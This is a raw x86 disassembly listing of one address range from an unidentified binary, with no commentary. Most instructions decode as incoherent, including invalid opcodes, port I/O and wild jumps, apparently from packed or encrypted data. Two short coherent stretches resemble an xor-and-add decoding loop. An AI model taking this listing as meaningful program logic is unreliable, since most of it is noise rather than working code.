  40c463:	fs cmc 
  40c465:	xchg   edx,eax
  40c466:	cdq    
  40c467:	sbb    edx,ebp
  40c469:	imul   edi,ebx,0x4bec215
  40c46f:	int3   
  40c470:	int    0xe1
  40c472:	or     ah,dl
  40c474:	and    al,0x26
  40c476:	cwde   
  40c477:	adc    eax,0x19b90221
  40c47c:	sub    al,0x4b
  40c47e:	cld    
  40c47f:	stos   BYTE PTR es:[edi],al
  40c480:	pop    ecx
  40c481:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c482:	sar    BYTE PTR [eax+0x2],cl
  40c485:	jp     0x40c494
  40c487:	push   ss
  40c488:	cmp    al,0xb2
  40c48a:	mov    edi,0x8d70bf68
  40c48f:	jns    0x40c50e
  40c491:	jg     0x40c498
  40c493:	mov    WORD PTR [eax+0x7a4d21f0],ss
  40c499:	cld    
  40c49a:	fadd   QWORD PTR [edx]
  40c49c:	lods   ax,WORD PTR es:[esi]
  40c49f:	std    
  40c4a0:	test   BYTE PTR [edx],bl
  40c4a2:	in     eax,dx
  40c4a3:	jbe    0x40c4f2
  40c4a5:	sub    al,0xe1
  40c4a7:	adc    cl,ch
  40c4a9:	mul    esi
  40c4ab:	mov    bh,0x75
  40c4ad:	xchg   edi,eax
  40c4ae:	jp     0x40c4c4
  40c4b0:	mov    al,ds:0xa4da6271
  40c4b5:	out    dx,al
  40c4b6:	sbb    BYTE PTR [esi-0x36290016],0x3a
  40c4bd:	aam    0xf9
  40c4bf:	mov    al,ds:0x48d0dd86
  40c4c4:	sbb    al,0xf5
  40c4c6:	sbb    ebp,DWORD PTR [edx-0x3c]
  40c4c9:	xchg   ebx,eax
  40c4ca:	sbb    dl,BYTE PTR ds:0x8cf57fc
  40c4d0:	sbb    DWORD PTR [eax],ecx
  40c4d2:	in     al,dx
  40c4d3:	test   eax,0xe7b1ef14
  40c4d8:	aam    0xfa
  40c4da:	cld    
  40c4db:	xor    ebp,ebp
  40c4dd:	in     al,0x1a
  40c4df:	cli    
  40c4e0:	ror    DWORD PTR [edi],0x7e
  40c4e3:	inc    ebx
  40c4e4:	stos   DWORD PTR es:[edi],eax
  40c4e5:	(bad)  
  40c4e6:	nop
  40c4e7:	fcom   DWORD PTR [ecx]
  40c4e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4ea:	loope  0x40c4d1
  40c4ec:	loopne 0x40c4f8
  40c4ee:	fisub  DWORD PTR [edi+0x34]
  40c4f1:	test   al,0xcd
  40c4f3:	adc    DWORD PTR [eax+0x1b],ecx
  40c4f6:	scas   al,BYTE PTR es:[edi]
  40c4f7:	mov    edi,0x41c1c6a5
  40c4fc:	push   esp
  40c4fd:	lahf   
  40c4fe:	lods   al,BYTE PTR ds:[esi]
  40c4ff:	cwde   
  40c500:	lods   eax,DWORD PTR ds:[esi]
  40c501:	dec    ecx
  40c502:	cdq    
  40c503:	sbb    al,BYTE PTR [eax-0x13]
  40c506:	push   0x674cd284
  40c50b:	inc    ecx
  40c50c:	mov    ch,0x5e
  40c50e:	jno    0x40c53d
  40c510:	nop
  40c511:	inc    ecx
  40c512:	outs   dx,BYTE PTR ds:[esi]
  40c513:	lds    esi,FWORD PTR [edx]
  40c515:	out    0xb6,eax
  40c517:	xchg   ebx,eax
  40c518:	(bad)  
  40c519:	in     eax,dx
  40c51a:	sbb    bl,BYTE PTR [esi+eax*2]
  40c51d:	aaa    
  40c51e:	in     al,dx
  40c51f:	jnp    0x40c569
  40c521:	xor    al,0xbf
  40c523:	xlat   BYTE PTR ds:[ebx]
  40c524:	loop   0x40c5a2
  40c526:	fdivr  QWORD PTR [ebx-0x2]
  40c529:	rcr    BYTE PTR ds:0x9379804f,0x65
  40c530:	adc    DWORD PTR [ebp+0x2496b896],0x7dbce20e
  40c53a:	iret   
  40c53b:	repz or al,0xf6
  40c53e:	int3   
  40c53f:	cmp    al,0xf8
  40c541:	ins    BYTE PTR es:[edi],dx
  40c542:	cmp    DWORD PTR [edx],ebx
  40c544:	call   FWORD PTR [ebx-0x5203bf46]
  40c54a:	aad    0x38
  40c54c:	or     eax,0x23773b04
  40c551:	dec    ebx
  40c552:	fcomp  DWORD PTR [edi+eax*4-0x216e5bee]
  40c559:	loop   0x40c501
  40c55b:	rcr    eax,0x79
  40c55e:	or     DWORD PTR [edx-0x40],eax
  40c561:	add    al,0x5e
  40c563:	adc    eax,0xd735511
  40c568:	pop    ds
  40c569:	or     bl,BYTE PTR [ecx]
  40c56b:	xchg   edi,eax
  40c56c:	pusha  
  40c56d:	mov    ds:0x39c2f16f,al
  40c572:	bound  eax,QWORD PTR [esi]
  40c574:	xchg   ebx,eax
  40c575:	xor    edi,esp
  40c577:	in     al,0x74
  40c579:	sbb    al,0x53
  40c57b:	pop    ss
  40c57c:	add    edi,esp
  40c57e:	cli    
  40c57f:	addr16 or al,0x71
  40c582:	daa    
  40c583:	xor    al,0x76
  40c585:	sub    BYTE PTR [eax-0x775cda9b],ch
  40c58b:	adc    eax,0xbc0ffd53
  40c590:	and    bh,BYTE PTR [ebp-0x12]
  40c593:	ret    0x9ad
  40c596:	out    dx,al
  40c597:	xchg   edx,eax
  40c598:	mov    al,0xcb
  40c59a:	cmc    
  40c59b:	pop    es
  40c59c:	fisttp WORD PTR ds:0x4e2ede4e
  40c5a2:	cdq    
  40c5a3:	xlat   BYTE PTR ds:[ebx]
  40c5a4:	pop    ebp
  40c5a5:	ins    DWORD PTR es:[edi],dx
  40c5a6:	push   ebx
  40c5a7:	das    
  40c5a8:	fild   WORD PTR [ebx+edi*1]
  40c5ac:	jg     0x40c579
  40c5ae:	add    dl,BYTE PTR [ebx]
  40c5b0:	push   edx
  40c5b1:	in     al,0x2
  40c5b3:	fsubp  st(3),st
  40c5b5:	jle    0x40c543
  40c5b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5b8:	mov    DWORD PTR [edi+0x6018af00],esp
  40c5be:	nop
  40c5bf:	sbb    al,BYTE PTR [esi]
  40c5c1:	or     dh,BYTE PTR [esi-0x3835db8a]
  40c5c7:	jge    0x40c54e
  40c5c9:	jle    0x40c563
  40c5cb:	fisubr DWORD PTR [esi+0x7c2e4ac5]
  40c5d1:	hlt    
  40c5d2:	ror    BYTE PTR [esi-0x73],cl
  40c5d5:	mov    fs,WORD PTR [ebx]
  40c5d7:	jae    0x40c5b9
  40c5d9:	cdq    
  40c5da:	je     0x40c5ef
  40c5dc:	xchg   edi,eax
  40c5dd:	mov    ebp,0xf57ea0c2
  40c5e2:	add    edx,esp
  40c5e4:	popa   
  40c5e5:	cdq    
  40c5e6:	div    esp
  40c5e8:	shl    BYTE PTR [eax+0x5ff8d811],0xaf
  40c5ef:	faddp  st(1),st
  40c5f1:	fistp  WORD PTR [edx+0x18ae4041]
  40c5f7:	push   ebp
  40c5f8:	jmp    0x40c5ea
  40c5fa:	mov    cl,dl
  40c5fc:	pop    es
  40c5fd:	jns    0x40c5d9
  40c5ff:	push   ds
  40c600:	push   cs
  40c601:	fs mov ebx,0x940d1217
  40c607:	pop    es
  40c608:	pusha  
  40c609:	out    dx,al
  40c60a:	mov    bh,0xfc
  40c60c:	jnp    0x40c5ef
  40c60e:	ror    DWORD PTR [ecx+0x43],0x64
  40c612:	in     al,0x26
  40c614:	xor    ebp,esp
  40c616:	mov    eax,ds:0x95c809f8
  40c61b:	sub    edi,edx
  40c61d:	xor    ebp,DWORD PTR [ebx+0x3]
  40c620:	adc    al,0xa6
  40c622:	mov    dh,0x35
  40c624:	repnz mov bl,0x13
  40c627:	call   0xdcb71dcd
  40c62c:	sbb    cl,BYTE PTR [esi-0x3f]
  40c62f:	inc    ebx
  40c630:	cmp    al,BYTE PTR [edi+0x6c992631]
  40c636:	mov    ?,WORD PTR [ebx+0x8842926]
  40c63c:	mov    bh,BYTE PTR [ebp-0x82ff2be]
  40c642:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c643:	pushw  0x50
  40c646:	fisttp QWORD PTR [esi]
  40c648:	std    
  40c649:	sbb    esi,edx
  40c64b:	data16 cld 
  40c64d:	adc    BYTE PTR [edx],dh
  40c64f:	mov    DWORD PTR [edi],edx
  40c651:	sbb    DWORD PTR [edx+ebx*1+0x48],ebp
  40c655:	aaa    
  40c656:	dec    edi
  40c657:	cli    
  40c658:	fidivr DWORD PTR [edi]
  40c65a:	adc    al,0xa8
  40c65c:	pop    eax
  40c65d:	sub    edi,edi
  40c65f:	adc    eax,0x20549bdd
  40c664:	sbb    al,0x43
  40c666:	sar    DWORD PTR [ecx+0x72],0x17
  40c66a:	mov    ?,WORD PTR [edi+0x4aa1f1d0]
  40c670:	sti    
  40c671:	ins    DWORD PTR es:[edi],dx
  40c672:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c673:	in     al,dx
  40c674:	mov    al,ds:0xe0bd869a
  40c679:	adc    DWORD PTR [edi],esp
  40c67b:	xor    BYTE PTR [ecx-0x33],bh
  40c67e:	repnz cmp DWORD PTR [edx-0x4259a6e5],edi
  40c685:	mov    DWORD PTR [ecx],ebp
  40c687:	sub    dh,BYTE PTR [ebx]
  40c689:	dec    ebp
  40c68a:	fadd   QWORD PTR [ecx+0x25]
  40c68d:	into   
  40c68e:	cmp    eax,0x8e8d8734
  40c693:	jnp    0x40c67c
  40c695:	fwait
  40c696:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c697:	inc    eax
  40c698:	mov    esi,0x32729b
  40c69d:	add    edi,esi
  40c69f:	div    edi
  40c6a1:	mov    edx,DWORD PTR [ebp-0x4]
  40c6a4:	xor    edx,ecx
  40c6a6:	lea    eax,[edx+eax*1+0x32729b]
  40c6ad:	mov    edx,DWORD PTR [ebp+0x8]
  40c6b0:	mov    edi,DWORD PTR [ebp-0x24]
  40c6b3:	mov    DWORD PTR [edi+edx*4],eax
  40c6b6:	mov    eax,DWORD PTR [ebp-0x18]
  40c6b9:	mov    edx,DWORD PTR [ebp+0x8]
  40c6bc:	xor    eax,ecx
  40c6be:	lea    eax,[eax+edx*1+0x32729b]
  40c6c5:	mov    DWORD PTR [ebp+0x8],eax
  40c6c8:	mov    eax,DWORD PTR [ebp-0x18]
  40c6cb:	jmp    0x40c92e
  40c6d0:	leave  
  40c6d1:	adc    bl,ah
  40c6d3:	cmp    eax,0x10f1ede3
  40c6d8:	xor    BYTE PTR [ebp-0x784e653f],dl
  40c6de:	push   edi
  40c6df:	or     bl,dh
  40c6e1:	cmp    BYTE PTR [esi+0x7e],0x38
  40c6e5:	jl     0x40c765
  40c6e7:	jle    0x40c719
  40c6e9:	cmp    dl,bl
  40c6eb:	(bad)  
  40c6ec:	rcr    esp,cl
  40c6ee:	aaa    
  40c6ef:	call   0x1ab80cd0
  40c6f4:	imul   esp,DWORD PTR [edi],0xa95be0c3
  40c6fa:	inc    ebx
  40c6fb:	mov    bh,0xdd
  40c6fd:	(bad)  
  40c6fe:	in     eax,dx
  40c6ff:	jg     0x40c763
  40c701:	test   DWORD PTR [esi],0x82aa04c1
  40c707:	cmp    DWORD PTR [ebp+0x6c1dfc73],ebx
  40c70d:	ds sub eax,0xca4b51e9
  40c713:	inc    esp
  40c714:	mov    eax,0xff74ea6a
  40c719:	inc    edx
  40c71a:	xchg   edi,eax
  40c71b:	sub    BYTE PTR [esp+ebp*2+0x25],al
  40c71f:	pop    ebx
  40c720:	mov    esi,DWORD PTR [esi]
  40c722:	mov    bh,0x8d
  40c724:	(bad)  
  40c725:	xor    BYTE PTR [eax+0x4b],bl
  40c728:	sub    al,BYTE PTR [edx+0x26]
  40c72b:	mov    ecx,DWORD PTR [eax-0x16123221]
  40c731:	(bad)  
  40c732:	ficom  WORD PTR [eax+ebx*8]
  40c735:	lds    edx,FWORD PTR [edi]
  40c737:	(bad)  
  40c739:	lds    ebx,FWORD PTR [ecx]
  40c73b:	(bad)  
  40c73c:	outs   dx,DWORD PTR ds:[esi]
  40c73d:	sti    
  40c73e:	push   ebx
  40c73f:	inc    ebp
  40c740:	stos   DWORD PTR es:[edi],eax
  40c741:	in     eax,0xbc
  40c743:	ja     0x40c6e2
  40c745:	sub    DWORD PTR [ecx+0x1b],ebx
  40c748:	call   0xd369:0xa97157e7
  40c74f:	into   
  40c750:	arpl   WORD PTR [esi-0x5d],dx
  40c753:	sbb    BYTE PTR cs:[esi],cl
  40c756:	cmp    al,0xbd
  40c758:	pop    ecx
  40c759:	ficom  WORD PTR [ecx]
  40c75b:	into   
  40c75c:	sub    DWORD PTR [esi-0x499122bc],ebp
  40c762:	dec    esi
  40c763:	lds    eax,FWORD PTR [ecx]
  40c765:	test   al,0xf2
  40c767:	mov    ebx,0xff3106df
  40c76c:	inc    ecx
  40c76d:	fiadd  DWORD PTR [ebp+0x57c1da82]
  40c773:	loopne 0x40c785
  40c775:	scas   al,BYTE PTR es:[edi]
  40c776:	scas   eax,DWORD PTR es:[edi]
  40c777:	dec    edi
  40c778:	out    0x25,al
  40c77a:	jb     0x40c7d1
  40c77c:	ret    
  40c77d:	add    eax,DWORD PTR [esi-0xc]
  40c780:	ret    
  40c781:	pop    edi
  40c782:	jno    0x40c797
  40c784:	xchg   eax,ebx
  40c786:	icebp  
  40c787:	and    cl,BYTE PTR [eax]
  40c789:	mov    WORD PTR [edi],es
  40c78b:	xor    dh,BYTE PTR ds:[eax]
  40c78e:	clc    
  40c78f:	jbe    0x40c7b0
  40c791:	sti    
  40c792:	ins    DWORD PTR es:[edi],dx
  40c793:	mov    eax,0xb3bfa21a
  40c798:	xor    DWORD PTR [eax],esp
  40c79a:	(bad)  
  40c79b:	nop
  40c79c:	imul   ebp,DWORD PTR [ebx-0x78f8b225],0xffffffb5
  40c7a3:	out    dx,eax
  40c7a4:	fcmovbe st,st(4)
  40c7a6:	mov    edx,0x9693c55c
  40c7ab:	mov    eax,0xd818d5e4
  40c7b0:	jbe    0x40c7ab
  40c7b2:	xor    ebx,DWORD PTR [ecx]
  40c7b4:	lock jecxz 0x40c782
  40c7b7:	xchg   BYTE PTR ds:0xaa528a0b,cl
  40c7bd:	push   ebx
  40c7bf:	mov    dl,0x4c
  40c7c1:	dec    ebp
  40c7c2:	jp     0x40c78f
  40c7c4:	jmp    DWORD PTR [ebx-0x62]
  40c7c7:	sahf   
  40c7c8:	add    al,0xef
  40c7ca:	adc    eax,0x3bf6106c
  40c7cf:	xor    bh,BYTE PTR [ebp+0x36dff77d]
  40c7d5:	fdivr  QWORD PTR [edi-0x75]
  40c7d8:	lahf   
  40c7d9:	sub    DWORD PTR [ecx],eax
  40c7db:	mov    ch,0xc3
  40c7dd:	pop    eax
  40c7de:	in     eax,dx
  40c7df:	aad    0xf4
  40c7e1:	mov    cl,0x48
  40c7e3:	inc    edx
  40c7e4:	pop    esi
  40c7e5:	sub    al,BYTE PTR [ecx]
  40c7e7:	add    ch,BYTE PTR [ecx-0x24]
  40c7ea:	inc    edx
  40c7eb:	and    dl,BYTE PTR [ecx]
  40c7ed:	and    BYTE PTR [ecx+0xc],dh
  40c7f0:	test   BYTE PTR [edx+0x2e],ch
  40c7f3:	in     al,dx
  40c7f4:	mov    edi,0x6b314811
  40c7f9:	cmp    al,0xda
  40c7fb:	dec    edx
  40c7fc:	add    al,0x7a
  40c7fe:	subps  xmm2,XMMWORD PTR [edi]
  40c801:	dec    esp
  40c802:	daa    
  40c803:	inc    ecx
  40c804:	nop
  40c805:	inc    edi
  40c806:	inc    esp
  40c807:	cmp    eax,0xfe8fa4f5
  40c80c:	dec    ebx
  40c80d:	repz xchg esi,eax
  40c80f:	int    0x4e
  40c811:	adc    DWORD PTR [edx+eiz*4],edi
  40c814:	jp     0x40c839
  40c816:	icebp  
  40c817:	retf   
  40c818:	mov    esi,0x9dcd9043
  40c81d:	punpckhdq mm2,QWORD PTR [ecx]
  40c820:	adc    dl,BYTE PTR [ebp+0x43b5ec02]
  40c826:	cs ins BYTE PTR es:[edi],dx
  40c828:	popf   
  40c829:	les    ebp,FWORD PTR [ebx+0x32d956a3]
  40c82f:	imul   ebx,DWORD PTR [edx+eax*2-0x11f9ed90],0xcaeeb356
  40c83a:	mov    gs,WORD PTR [ebx+0x60e4b685]
  40c840:	dec    eax
  40c841:	push   edi
  40c842:	ins    BYTE PTR es:[edi],dx
  40c843:	sub    bl,BYTE PTR [esi-0x5f9b73ac]
  40c849:	dec    ebp
  40c84a:	loope  0x40c866
  40c84c:	adc    BYTE PTR [esi],0x87
  40c84f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c850:	je     0x40c808
  40c852:	push   esi
  40c853:	cmp    bl,ch
  40c855:	sar    BYTE PTR [edi],1
  40c857:	scas   eax,DWORD PTR es:[edi]
  40c858:	icebp  
  40c859:	pop    ebp
  40c85a:	dec    esp
  40c85b:	mov    esi,0x2118f14c
  40c860:	sahf   
  40c861:	sbb    edi,DWORD PTR [edx-0x611792a5]
  40c867:	jb     0x40c810
  40c869:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c86a:	sub    dh,BYTE PTR [edx+0x6160c089]
  40c870:	in     eax,dx
  40c871:	jmp    0xc8a06dc0
  40c876:	fsub   DWORD PTR [edi-0x1d]
  40c879:	dec    edi
  40c87a:	pop    ecx
  40c87b:	jp     0x40c8b1
  40c87d:	loop   0x40c818
  40c87f:	lods   al,BYTE PTR ds:[esi]
  40c880:	in     al,dx
  40c881:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c882:	pop    ss
  40c883:	xor    ecx,edx
  40c885:	adc    ch,cl
  40c887:	sbb    DWORD PTR [ecx+edx*2-0x22d6508d],eax
  40c88e:	push   ecx
  40c88f:	push   es
  40c890:	sbb    al,0x4
  40c892:	icebp  
  40c893:	(bad)  
  40c894:	hlt    
  40c895:	daa    
  40c896:	aaa    
  40c897:	mov    bl,0xcc
  40c899:	mov    al,ds:0xfc239f3a
  40c89e:	sbb    ebp,esp
  40c8a0:	int    0xd1
  40c8a2:	jle    0x40c8c3
  40c8a4:	out    dx,al
  40c8a5:	out    dx,al
  40c8a6:	cmc    
  40c8a7:	ds daa 
  40c8a9:	in     eax,dx
  40c8aa:	push   0xe6c89ff5
  40c8af:	jp     0x40c8c2
  40c8b1:	push   0xce05cf13
  40c8b6:	push   ebp
  40c8b7:	fnsave [esi+0x7e3559ff]
  40c8bd:	adc    al,0x6f
  40c8bf:	cmp    esi,ebp
  40c8c1:	dec    ebp
  40c8c2:	out    dx,al
  40c8c3:	pop    esp
  40c8c4:	jl     0x40c878
  40c8c6:	jg     0x40c90f
  40c8c8:	test   eax,0x1d9dd587
  40c8cd:	mov    BYTE PTR [edi-0xf],bh
  40c8d0:	xlat   BYTE PTR ds:[ebx]
  40c8d1:	cld    
  40c8d2:	xchg   ebx,eax
  40c8d3:	push   edx
  40c8d4:	push   cs
  40c8d5:	cmp    al,0xac
  40c8d7:	add    BYTE PTR [esi-0x390cf670],ah
  40c8dd:	daa    
  40c8de:	cmp    esi,eax
  40c8e0:	fisttp WORD PTR [esi-0x3afdb634]
  40c8e6:	push   esp
  40c8e7:	sbb    DWORD PTR [edi-0x5c3ab8f2],eax
  40c8ed:	pop    ebp
  40c8ee:	mov    edx,0x516ce5d0
  40c8f3:	je     0x40c919
  40c8f5:	(bad)  
  40c8f6:	push   esp
  40c8f7:	xlat   BYTE PTR ds:[ebx]
  40c8f8:	(bad)  
  40c8f9:	ftst   
  40c8fb:	in     al,dx
  40c8fc:	or     al,ah
  40c8fe:	dec    esi
  40c8ff:	es mov ecx,0xcf48e539
  40c905:	sub    BYTE PTR [edx+0x7d],al
  40c908:	fisttp QWORD PTR [esi-0x68]
  40c90b:	xchg   esi,eax
  40c90c:	jno    0x40c922
  40c90e:	cmp    DWORD PTR [edx+0x1b],eax
  40c911:	inc    ebx
  40c912:	adc    esi,DWORD PTR [ecx+edi*4-0x213d386c]
  40c919:	mov    dl,0x6f
  40c91b:	addr16 mov bh,0x74
  40c91e:	(bad)  
  40c91f:	cwde   
  40c920:	test   eax,0xa36544de
  40c925:	jnp    0x40c919
  40c927:	lahf   
  40c928:	test   BYTE PTR [eax-0x9cd28a6],0x8b
  40c92f:	push   ebp
  40c930:	adc    al,0x33
  40c932:	shr    ecx,0x5e
  40c935:	add    al,BYTE PTR [eax]
  40c937:	add    BYTE PTR [edi],al
  40c939:	mov    ah,0x6
  40c93b:	cwde   
  40c93c:	mov    ch,0xa8
  40c93e:	mov    eax,ds:0x31ca67b1
  40c943:	cmp    DWORD PTR [ebx-0x67e81257],edx
  40c949:	mov    ?,WORD PTR [esi+0x7e]
  40c94c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c950:	ds cli 
  40c952:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c953:	in     al,0x97
  40c955:	fadd   QWORD PTR [esi+0x1e]
  40c958:	pop    esi
  40c959:	imul   eax,DWORD PTR [esi+eiz*4],0x7908aa80
  40c960:	jmp    0xf71f:0xb86e44aa
  40c967:	push   ds
  40c968:	sbb    BYTE PTR [esp+esi*4+0x41],bl
  40c96c:	aam    0x4d
  40c96e:	sbb    eax,0xe4616df9
  40c973:	out    0x6c,eax
  40c975:	imul   BYTE PTR ds:0x9bbe2d64
  40c97b:	fdiv   st(5),st
  40c97d:	test   eax,0x93f8006d
  40c982:	inc    ebx
  40c983:	test   DWORD PTR [ecx+0x50],0x9e5ba253
  40c98a:	jle    0x40ca00
  40c98c:	xchg   edx,eax
  40c98d:	loopne 0x40c939
  40c98f:	mov    ebx,DWORD PTR [edi]
  40c991:	mov    dl,0x9d
  40c993:	rcr    BYTE PTR [ebp-0x4ef54304],1
  40c999:	inc    edi
  40c99a:	mov    al,ds:0x9820ef07
  40c99f:	data16 arpl dx,si
  40c9a2:	add    cl,BYTE PTR [ebp+eax*4-0x56]
  40c9a6:	addr16 out 0x56,eax
  40c9a9:	pop    eax
  40c9aa:	push   edi
  40c9ab:	mov    ch,0x4f
  40c9ad:	dec    edi
  40c9ae:	pop    es
  40c9af:	mov    dl,0xc2
  40c9b1:	jecxz  0x40ca21
  40c9b3:	xor    eax,0x22ca6f82
  40c9b8:	dec    edx
  40c9b9:	fsub   QWORD PTR [eax]
  40c9bb:	icebp  
  40c9bc:	ds push ebx
  40c9be:	daa    
  40c9bf:	test   eax,0xd37bbb7b
  40c9c4:	mov    eax,ds:0xe235a3af
  40c9c9:	push   ecx
  40c9ca:	loop   0x40ca3e
  40c9cc:	mov    ah,0x9
  40c9ce:	cmp    bl,BYTE PTR [esi-0x42]
  40c9d1:	leave  
  40c9d2:	xchg   esi,eax
  40c9d3:	jb     0x40ca53
  40c9d5:	(bad)  
  40c9d6:	std    
  40c9d7:	rcr    ch,0x62
  40c9da:	ins    BYTE PTR es:[edi],dx
  40c9db:	lods   al,BYTE PTR ds:[esi]
  40c9dc:	shl    DWORD PTR ds:0xcccaa0da,0x94
  40c9e3:	out    0x76,eax
  40c9e5:	addr16 lahf 
  40c9e7:	mov    esi,0xd2fd443
  40c9ec:	mov    ch,0x6
  40c9ee:	les    edx,FWORD PTR [edx-0x75]
  40c9f1:	and    eax,0xb42e1816
  40c9f6:	ss test eax,0xb11e4dbc
  40c9fc:	adc    BYTE PTR [eax-0x4e1595cf],ah
  40ca02:	push   esp
  40ca03:	jae    0x40c9c4
  40ca05:	add    BYTE PTR [ecx],0x3f
  40ca08:	retf   
  40ca09:	in     eax,dx
  40ca0a:	dec    ebx
  40ca0b:	lock xor eax,0x41102706
  40ca11:	ret    
  40ca12:	push   0xffffffc7
  40ca14:	add    edx,DWORD PTR [ecx-0x51]
  40ca17:	xor    BYTE PTR [eax-0x7f126ac7],0x3
  40ca1e:	jp     0x40ca90
  40ca20:	test   eax,0x39d5e1b4
  40ca25:	clc    
  40ca26:	std    
  40ca27:	add    al,0xe4
  40ca29:	js     0x40c9fc
  40ca2b:	add    BYTE PTR [ebx+ebx*2+0x6fd1c8b7],ah
  40ca32:	int3   
  40ca33:	int3   
  40ca34:	push   edx
  40ca35:	in     eax,dx
  40ca36:	iret   
  40ca37:	daa    
  40ca38:	mov    WORD PTR [eax+eax*8-0x7e],cs
  40ca3c:	ins    DWORD PTR es:[edi],dx
  40ca3d:	(bad)
  40ca40:	mov    esi,0x7571d42e
  40ca45:	jbe    0x40c9c9
  40ca47:	dec    ebx
  40ca48:	(bad)  
  40ca49:	bound  esi,QWORD PTR [esi+0x2073f1ef]
  40ca4f:	push   es
  40ca50:	mov    ebp,0x47cba66f
  40ca55:	scas   eax,DWORD PTR es:[edi]
  40ca56:	sbb    eax,0x3a4b3357
  40ca5b:	and    BYTE PTR [ebx-0x4d],ah
  40ca5e:	sub    DWORD PTR [edi+0x3644daa4],ebx
  40ca64:	int    0x6a
  40ca66:	pop    ecx
  40ca67:	inc    esi
  40ca68:	xchg   ecx,eax
  40ca69:	mov    ds:0xafc8ce,eax
  40ca6e:	dec    ebx
  40ca6f:	es xchg edx,eax
  40ca71:	and    dl,BYTE PTR [ebp+0x3f87d78c]
  40ca77:	push   ebx
  40ca78:	in     eax,0x1d
  40ca7a:	int3   
  40ca7b:	cmp    esi,esi
  40ca7d:	and    DWORD PTR [ebx+ecx*4-0x6722347e],esp
  40ca84:	in     al,dx
  40ca85:	fsubr  st(3),st
  40ca87:	push   ecx
  40ca88:	cs es ja 0x40cae7
  40ca8c:	xchg   esi,eax
  40ca8d:	inc    esp
  40ca8e:	cmp    al,0xef
  40ca90:	retf   
  40ca91:	cmp    bh,BYTE PTR [eax-0x10]
  40ca94:	jnp    0x40cb0e
  40ca96:	inc    edx
  40ca97:	pop    ebp
  40ca98:	ret    0x8d2e
  40ca9b:	arpl   WORD PTR [esi],ax
  40ca9d:	fwait
  40ca9e:	mov    al,0x83
  40caa0:	adc    dh,BYTE PTR [ebx+0x39]
  40caa3:	inc    eax
  40caa4:	ss and dl,0xfa
  40caa8:	cdq    
  40caa9:	adc    ebp,0xfffffff2
  40caac:	cmc    
  40caad:	dec    ebx
  40caae:	pop    edx
  40caaf:	mov    eax,0x6d56e675
  40cab4:	mov    dh,0x21
  40cab6:	and    BYTE PTR [ebp-0xe],ah
  40cab9:	fsub   QWORD PTR [edi+eax*4+0xc]
  40cabd:	sub    DWORD PTR [ebx-0x3aec09c3],0x5928011e
  40cac7:	(bad)  
  40cac8:	repnz dec ecx
  40caca:	mov    eax,0x8a653f5a
  40cacf:	nop
  40cad0:	test   al,0x64
  40cad2:	pop    ss
  40cad3:	mov    esi,DWORD PTR [ecx]
  40cad5:	pop    edi
  40cad6:	retf   
  40cad7:	mov    edx,0xe9fe5d1c
  40cadc:	daa    
  40cadd:	loopne 0x40cad2
  40cadf:	jmp    0x35954ac1
  40cae4:	xor    bh,bl
  40cae6:	push   ss
  40cae7:	out    dx,al
  40cae8:	popa   
  40cae9:	mov    eax,0xa421f6c
  40caee:	push   ebp
  40caef:	mov    al,ds:0x7f7a65f7
  40caf4:	xchg   BYTE PTR [eax],bh
  40caf6:	test   BYTE PTR [esp+ebx*8+0x4bb9a307],ah
  40cafd:	adc    ch,bl
  40caff:	fidiv  WORD PTR [eax-0x26cb8189]
  40cb05:	push   0xb18e5feb
  40cb0a:	pop    ebx
  40cb0b:	push   0xffffff85
  40cb0d:	ret    
  40cb0e:	add    BYTE PTR [ebp+eax*2+0x1c48b415],al
  40cb15:	cli    
  40cb16:	push   eax
  40cb17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb18:	das    
  40cb19:	fadd   DWORD PTR [ecx]
  40cb1b:	cld    
  40cb1c:	sub    ecx,DWORD PTR [eax-0x78]
  40cb1f:	pop    ebx
  40cb20:	mov    eax,0xc8dbe776
  40cb25:	adc    cl,BYTE PTR [ebx]
  40cb27:	sbb    BYTE PTR [edi],bh
  40cb29:	mov    ecx,0x37aa57c0
  40cb2e:	pop    ds
  40cb2f:	rcr    edx,1
  40cb31:	ins    DWORD PTR es:[edi],dx
  40cb32:	mov    ebx,0x1fc174fc
  40cb37:	data16 mov al,ds:0xf5a33a73
  40cb3d:	out    dx,eax
  40cb3e:	shl    BYTE PTR [ecx],1
  40cb40:	test   eax,0x8cd2f2ea
  40cb45:	cmc    
  40cb46:	xor    al,0x69
  40cb48:	xchg   edx,eax
  40cb49:	adc    cl,ah
  40cb4b:	jno    0x40cb14
  40cb4d:	mov    esi,DWORD PTR [ebx+edx*8-0x3a059994]
  40cb54:	add    cl,dh
  40cb56:	arpl   dx,bp
  40cb58:	cmp    al,ah
  40cb5a:	mov    al,ds:0x6c6eed50
  40cb5f:	sbb    DWORD PTR [edx],esi
  40cb61:	scas   eax,DWORD PTR es:[edi]
  40cb62:	mov    cl,BYTE PTR [esp+edx*1+0x40d4ea55]
  40cb69:	push   ss
  40cb6a:	mov    BYTE PTR [edx-0x3f933cee],al
  40cb70:	xchg   edx,eax
  40cb71:	mov    eax,fs
  40cb73:	mov    DWORD PTR [edi-0x27bfc6e6],ecx
  40cb79:	out    dx,eax
  40cb7a:	fld    TBYTE PTR ds:[edx-0x5d]
  40cb7e:	jge    0x40cb2d
  40cb80:	in     al,dx
  40cb81:	int3   
  40cb82:	out    0xf8,al
  40cb84:	out    0xa2,eax
  40cb86:	fidiv  DWORD PTR [ebp+0x5c]
  40cb89:	imul   edx,DWORD PTR [ecx],0x985d0cfb
  40cb8f:	xor    ah,BYTE PTR [ecx-0x697b43b8]
  40cb95:	test   DWORD PTR [ebx],0x2af0fc6
  40cb9b:	mov    edx,DWORD PTR [ebp-0x4]
  40cb9e:	xor    edx,ecx
  40cba0:	mov    ecx,DWORD PTR [ebp+0x8]
  40cba3:	lea    ecx,[edx+ecx*1+0x32729b]
  40cbaa:	cmp    ecx,eax
  40cbac:	jne    0x40c41f
